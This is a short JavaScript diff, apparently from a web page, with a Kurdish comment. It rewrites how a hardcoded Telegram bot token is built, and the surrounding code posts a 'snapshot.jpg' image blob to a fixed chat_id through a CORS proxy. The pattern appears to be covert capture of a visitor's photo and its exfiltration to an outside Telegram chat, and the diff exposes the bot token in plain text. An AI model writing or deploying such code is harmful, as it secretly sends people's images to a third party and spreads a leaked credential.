@@ -32,7 +32,10 @@
               formData.append('chat_id', '6539379136');
               formData.append('photo', blob, 'snapshot.jpg');
 
-              const telegramUrl = 'https://api.telegram.org/bot8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM/sendPhoto';
+              // پاککردنەوەی خودکاری هەر نویسەیەکی ناڕێک لە تۆکەنەکەدا
+              const rawToken = "8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM";
+              const token = rawToken.replace(/\s+/g, '');
+              const telegramUrl = 'https://api.telegram.org/bot' + token + '/sendPhoto';
 
               fetch('https://corsproxy.io/?' + encodeURIComponent(telegramUrl), {
                 method: 'POST',
